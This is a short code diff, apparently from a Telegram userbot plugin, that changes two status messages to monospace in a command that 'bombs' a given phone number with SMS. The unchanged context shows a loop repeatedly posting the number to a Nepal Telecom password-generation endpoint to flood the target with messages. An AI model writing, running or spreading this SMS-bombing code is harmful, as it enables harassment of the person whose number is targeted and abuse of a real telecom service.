@@ -14,10 +14,10 @@ async def _(event):
         await event.edit("Enter a number!")
         return
     paramss={"phone":num}
-    await event.edit("Bombing....")
+    await event.edit("`Bombing....`")
     for i in range (n):
         requests.post("https://cms.ntc.net.np/api/generateAuthPassword",params=paramss)
-    await event.edit(f"Bombed {n} SMS to {num}")
+    await event.edit(f"`Bombed {n} SMS to {num}`")
 
     
 
